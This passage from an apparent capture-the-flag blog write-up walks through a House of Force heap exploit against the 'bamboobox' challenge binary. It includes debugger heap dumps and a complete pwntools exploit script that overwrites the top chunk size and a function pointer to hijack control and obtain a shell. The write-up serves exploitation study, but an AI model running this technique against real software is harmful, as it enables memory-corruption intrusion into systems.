+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">magic</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> fd ;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>	fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/home/bamboobox/flag&#34;</span>,O_RDONLY);
+</span></span><span style="display:flex;"><span>	read(fd,buffer,<span style="color:#66d9ef">sizeof</span>(buffer));
+</span></span><span style="display:flex;"><span>	close(fd);
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;%s&#34;</span>,buffer);
+</span></span><span style="display:flex;"><span>	exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>okay, we have our &ldquo;magic&rdquo; function in which we will leverage to get our flag. This is probably the function
+we will use to overwrite the goodbye_message() function pointer on the heap with. I have recompiled this
+to just directly give us a shell. We may also later just completely get rid of this easy function
+and resort to leaking addresses of libc and overwriting something like __malloc_hook.</p>
+<p>okay, lets play around with the binary now. We know that in order to perform our house of force
+technique, we would prefereably need a heap overflow. Any vulnerability that would allow us
+access over the top chunk(wilderness) size metadata will work out fine, but heap overflows are
+prefered.</p>
+<p>Lets play with the binary and see if we can replicate one.</p>
+<pre tabindex="0"><code>There is a box with magic
+what do you want to do in the box
+----------------------------
+Bamboobox Menu
+----------------------------
+1.show the items in the box
+2.add a new item
+3.change the item in the box
+4.remove the item in the box
+5.exit
+----------------------------
+Your choice:2
+Please enter the length of item name:16
+Please enter the name of item:AAAAAAAAAAAAAAAA
+</code></pre><pre tabindex="0"><code>----------------------------
+Bamboobox Menu
+----------------------------
+1.show the items in the box
+2.add a new item
+3.change the item in the box
+4.remove the item in the box
+5.exit
+----------------------------
+Your choice:1
+0 : AAAAAAAAAAAAAAAA
+</code></pre><pre tabindex="0"><code>----------------------------
+Bamboobox Menu
+----------------------------
+1.show the items in the box
+2.add a new item
+3.change the item in the box
+4.remove the item in the box
+5.exit
+----------------------------
+Your choice:3
+Please enter the index of item:0
+Please enter the length of item name:20
+Please enter the new name of the item:BBBBBBBBBBBBBBBBBBBB
+</code></pre><pre tabindex="0"><code>----------------------------
+Bamboobox Menu
+----------------------------
+1.show the items in the box
+2.add a new item
+3.change the item in the box
+4.remove the item in the box
+5.exit
+----------------------------
+Your choice:1
+0 : BBBBBBBBBBBBBBBBBBBB
+----------------------------
+</code></pre><p>yes, so as we can see, we have a heap overflow on the change/edit item
+within the box. This will allow us to write more bytes than the buffer on the
+heap can contain, which will enable us to edit chunk metadata.</p>
+<p>There are several variants of the house of force techniques, and many applications
+that may be leveraged within the general concept of house of force. The main application
+in which we can leverage this heap overflow, is by overwriting the top chunk&rsquo;s wilderness
+metadata value into something massive. We can overwrite the wilderness with the largest value
+an unsigned integer can represent, &ldquo;-1&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#a6e22e">gef</span><span style="color:#960050;background-color:#1e0010">➤</span>  heap chunks
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Chunk</span>(addr<span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">0x555556269010</span>, size<span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">0x250</span>, flags<span style="color:#960050;background-color:#1e0010">=</span>PREV_INUSE)
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">[0</span><span style="color:#a6e22e">x0000555556269010</span>     <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>    ................]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Chunk</span>(addr<span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">0x555556269260</span>, size<span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">0x20</span>, flags<span style="color:#960050;background-color:#1e0010">=</span>PREV_INUSE)
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">[0</span><span style="color:#a6e22e">x0000555556269260</span>     <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>    F.@.....a.@.....]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Chunk</span>(addr<span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">0x555556269280</span>, size<span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">0x40</span>, flags<span style="color:#960050;background-color:#1e0010">=</span>PREV_INUSE)
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">[0</span><span style="color:#a6e22e">x0000555556269280</span>     <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span>    AAAAAAAAAAAAAAAA]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Chunk</span>(addr<span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">0x5555562692c0</span>, size<span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">0xfffffffffffffff8</span>, flags<span style="color:#960050;background-color:#1e0010">=</span>PREV_INUSE<span style="color:#f92672">|</span>IS_MMAPPED<span style="color:#f92672">|</span>NON_MAIN_ARENA)  <span style="color:#960050;background-color:#1e0010">←</span>  top chunk
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">gef</span><span style="color:#960050;background-color:#1e0010">➤</span>  
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x5555562691b0: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x5555562691c0: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x5555562691d0: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x5555562691e0: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x5555562691f0: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x555556269200: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x555556269210: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x555556269220: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x555556269230: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x555556269240: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x555556269250: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000021</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x555556269260: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000400846</span>      <span style="color:#ae81ff">0x0000000000400861</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x555556269270: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000041</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x555556269280: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4141414141414141</span>      <span style="color:#ae81ff">0x4141414141414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x555556269290: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4141414141414141</span>      <span style="color:#ae81ff">0x4141414141414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x5555562692a0: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4141414141414141</span>      <span style="color:#ae81ff">0x4141414141414141</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x5555562692b0: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4141414141414141</span>      <span style="color:#ae81ff">0xffffffffffffffff</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x5555562692c0: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x5555562692d0: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x5555562692e0: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x5555562692f0: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x555556269300: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x555556269310: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x555556269320: <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0000000000000000</span>      <span style="color:#ae81ff">0x0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">gef</span><span style="color:#960050;background-color:#1e0010">➤</span>  
+</span></span></code></pre></div><p>We can overwrite the wilderness value with 0xffffffffffffffff, which is 8 bytes of 0xff, which
+will represent our -1 value. If you are viewing the chunk within gdb-gef, you may notice some
+strange things with top chunk size. For example, it may say 0xffffffffffffffff8, instead of
+0xffffffffffffffff. This is due to the bit flags that have been set, if you were to manually
+check the value of the wilderness, you would find that it was still 0xffffffffffffffff.</p>
+<p>Okay, now lets get onto the real overwriting part. How can we overwrite the wilderness?</p>
+<p>we can either guess and check repeatedly through gdb, or we can just calculate it by using
+offsets within the addresses. The formula goes like this:</p>
+<p>address_of_wilderness - address_of_chunk0_start</p>
+<p>its pretty simple, but this is how you would go about calculating the offset to the wilderness.</p>
+<p>once we have overwritten the wilderness, what can we do next?</p>
+<p>it seems like we have free reign to allocation chunks outside of the heap correct??
+well, we dont exactly want to, lets view the heap and see what we can work with.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>requestSize = (size_t)victim            // The target address/chunk that malloc should return
+</span></span><span style="display:flex;"><span>                - (size_t)top_chunk     // The present address of the top chunk/addr of wilderness
+</span></span><span style="display:flex;"><span>                - 2*sizeof(long long)   // Size of &#39;size&#39; and &#39;prev_size&#39; / sizeof(long long)*2 = 16;
+</span></span><span style="display:flex;"><span>                - sizeof(long long);    // Additional buffer / sizeof(long long) = 8;
+</span></span></code></pre></div><p>as we can see, the general formula to follow is this. The addresses you provide dont need to be
+specifically accurate for the majority of the time. It will pad out and allocate with 16 bytes.</p>
+<p>here is the exploit, tested for ubuntu xenial 16.04</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># glibc 2.23 &amp; 2.27</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> process,ELF,context,remote,pause
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> fastpwn <span style="color:#f92672">import</span> pack,log
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> argv
+</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>,os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>)
+</span></span><span style="display:flex;"><span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#34;./bamboobox&#34;</span>,checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>,checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(argv)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;-r&#34;</span>:
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#34;ubuntu.box&#34;</span>,<span style="color:#ae81ff">9999</span>) <span style="color:#75715e">#glibc 2.33 vm</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">=</span>process([<span style="color:#e6db74">&#34;./ld-2.27.so&#34;</span>,<span style="color:#e6db74">&#34;./bamboobox&#34;</span>],env<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;LD_PRELOAD&#39;</span>:<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>})
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## helper func, only for sending ascii, no raw bytes</span>
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> x,r<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;:&#34;</span>:p<span style="color:#f92672">.</span>sendlineafter(str(r),str(x)) <span style="color:#66d9ef">if</span> r <span style="color:#66d9ef">else</span> p<span style="color:#f92672">.</span>sendline(str(x))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_item</span>():
+</span></span><span style="display:flex;"><span>    s(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;choice:&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_item</span>(sz,n):
+</span></span><span style="display:flex;"><span>    s(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">&#34;choice:&#34;</span>)
+</span></span><span style="display:flex;"><span>    s(sz)
+</span></span><span style="display:flex;"><span>    s(n)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit_item</span>(ind,nl,nn):
+</span></span><span style="display:flex;"><span>    s(<span style="color:#ae81ff">3</span>,<span style="color:#e6db74">&#34;choice:&#34;</span>)
+</span></span><span style="display:flex;"><span>    s(ind)
+</span></span><span style="display:flex;"><span>    s(nl)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>,nn)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove_item</span>(ind):
+</span></span><span style="display:flex;"><span>    s(<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">&#34;choice:&#34;</span>)
+</span></span><span style="display:flex;"><span>    s(ind)
+</span></span><span style="display:flex;"><span>magic<span style="color:#f92672">=</span>binary<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;magic&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_item(<span style="color:#ae81ff">48</span>,<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">48</span>) <span style="color:#75715e"># usable chunk size: 56 ; real size: 64/65</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit_item(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">64</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">56</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xff\xff\xff\xff\xff\xff\xff</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># overwrite wilderness</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>log(<span style="color:#e6db74">&#34;overwrite wilderness&#34;</span>)
+</span></span><span style="display:flex;"><span>pause()
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#offset to wilderness &amp; overwrite w/ -1</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#add_item(&#34;-112&#34;,&#34;AAAAAAAA&#34;)</span>
+</span></span><span style="display:flex;"><span>add_item(<span style="color:#e6db74">&#34;-112&#34;</span>,<span style="color:#e6db74">&#34;AAAAAAAA&#34;</span>) <span style="color:#75715e"># will overwrite welcome_message func ptr with AAAAAAAA</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># malloc will return usable chunk size of 4294971376 between -104 and -118</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># general formula around calculating the &#34;approximate&#34; chunk size to pass to malloc after h.o.f</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># requestSize = (size_t)victim            // The target address/chunk that malloc should return</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                 - (size_t)top_chunk     // The present address of the top chunk/addr of wilderness</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                 - 2*sizeof(long long)   // Size of &#39;size&#39; and &#39;prev_size&#39; / sizeof(long long)*2 = 16;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                 - sizeof(long long);    // Additional buffer / sizeof(long long) = 8;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># credit: https://heap-exploitation.dhavalkapil.com/attacks/house_of_force</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pause()</span>
+</span></span><span style="display:flex;"><span>add_item(<span style="color:#e6db74">&#34;16&#34;</span>,<span style="color:#e6db74">&#34;overflow_me_senpai&#34;</span>) <span style="color:#75715e"># alloc new chunk, overwrite func ptrs</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit_item(<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">16</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> pack<span style="color:#f92672">.</span>pk64(magic)) <span style="color:#75715e"># edit, and overwrite</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># idk if we need this, but i dont wanna edit my add_item helper func and edit everything to send raw</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pause()</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;choice:&#34;</span>,<span style="color:#e6db74">&#34;5&#34;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>log(<span style="color:#e6db74">&#34;SHELL INCOMING!!! SHELL INCOMING!!!&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://xcr0.github.io/posts/hacknote/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Pwnable.tw Hacknote</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://xcr0.github.io/posts/fastbin/">
+                <span class="button__text">Glibc Fastbin</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://xcr0.github.io/assets/main.js"></script>
+<script src="https://xcr0.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
